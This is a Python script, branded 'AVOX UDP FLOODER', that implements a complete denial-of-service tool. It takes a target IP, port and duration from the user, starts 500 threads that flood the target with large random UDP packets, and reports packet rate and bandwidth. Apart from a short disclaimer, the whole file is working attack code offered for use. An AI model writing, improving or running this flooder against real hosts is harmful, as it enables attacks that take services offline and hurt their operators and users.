"""
Enhanced UDP Flooder for High-Bandwidth Attacks  
WARNING: Only use this on systems you own or have explicit permission to test.  
Unauthorized use is illegal and can result in severe penalties.  

Copyright © AVOX - All rights reserved.  
"""  

import socket  
import random  
import threading  
import time  
import sys  
import os  
import signal  
from os import system, name  

# Constants for high-performance flooding  
PACKET_SIZE = 1400  # Optimal size for high throughput  
THREADS = 500       # Increased thread count  
BATCH_SIZE = 100    # Packets to send per socket operation  

class UDPFlooder:  
    def __init__(self, target_ip, target_port, duration):  
        self.target_ip = target_ip  
        self.target_port = target_port  
        self.duration = duration  
        self.sent_packets = 0  
        self.running = False  
        self.threads = []  
        self.start_time = 0  
          
    def generate_payload(self):  
        """Generate random payload for each packet"""  
        return random._urandom(PACKET_SIZE)  
      
    def flood(self):  
        """Main flooding function for each thread"""  
        while self.running:  
            try:  
                # Create raw socket for maximum performance  
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)  
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
                  
                # Set socket buffer size to maximum  
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**30)  
                  
                # Send packets in batches for better performance  
                for _ in range(BATCH_SIZE):  
                    try:  
                        s.sendto(self.generate_payload(), (self.target_ip, self.target_port))  
                        self.sent_packets += 1  
                    except:  
                        pass  
                  
                s.close()  
            except:  
                pass  
      
    def start(self):  
        """Start the flood attack"""  
        self.running = True  
        self.start_time = time.time()  
          
        # Create and start threads  
        for _ in range(THREADS):  
            t = threading.Thread(target=self.flood)  
            t.daemon = True  
            t.start()  
            self.threads.append(t)  
          
        # Monitor progress  
        self.monitor()  
      
    def stop(self):  
        """Stop the flood attack"""  
        self.running = False  
        for t in self.threads:  
            t.join()  
      
    def monitor(self):  
        """Monitor and display attack statistics"""  
        last_count = 0  
        last_time = time.time()  
          
        while self.running and (time.time() - self.start_time < self.duration):  
            time.sleep(1)  
              
            # Calculate packets/s and estimated bandwidth  
            current_count = self.sent_packets  
            current_time = time.time()  
              
            packets_per_second = (current_count - last_count) / (current_time - last_time)  
            bandwidth = (packets_per_second * PACKET_SIZE * 8) / (1024**3)  # in Gbps  
              
            last_count = current_count  
            last_time = current_time  
              
            # Display stats  
            elapsed = int(current_time - self.start_time)  
            sys.stdout.write(f"\r[+] Elapsed: {elapsed}s | Packets: {current_count:,} | Rate: {packets_per_second:,.0f} pps | Bandwidth: {bandwidth:.2f} Gbps")  
            sys.stdout.flush()  
          
        self.stop()  
        print("\n[+] Attack completed")  

def clear_screen():  
    """Clear the terminal screen"""  
    os.system('cls' if name == 'nt' else 'clear')  

def signal_handler(sig, frame):  
    """Handle CTRL+C"""  
    print("\n[!] Stopping attack...")  
    if 'flooder' in globals():  
        flooder.stop()  
    sys.exit(0)  

if __name__ == "__main__":  
    # Set up signal handler  
    signal.signal(signal.SIGINT, signal_handler)  
      
    # Display banner  
    clear_screen()  
    print("\033[1;31;40m")  
    os.system("figlet AVOX UDP FLOODER -f slant")  
    print("\033[1;33;40mWARNING: This tool is for authorized testing only. Misuse is illegal.\n")  
    print("\033[1;32;40m==> Copyright © AVOX - All rights reserved <==\n")  
      
    # Get user input  
    try:  
        target_ip = input("Target IP: ")  
        target_port = int(input("Target Port: "))  
        duration = int(input("Duration (seconds): "))  
          
        # Validate input  
        if not target_ip or target_port < 1 or target_port > 65535 or duration < 1:  
            raise ValueError("Invalid input parameters")  
          
        # Start attack  
        flooder = UDPFlooder(target_ip, target_port, duration)  
        flooder.start()  
          
    except Exception as e:  
        print(f"[!] Error: {e}")  
        sys.exit(1)  
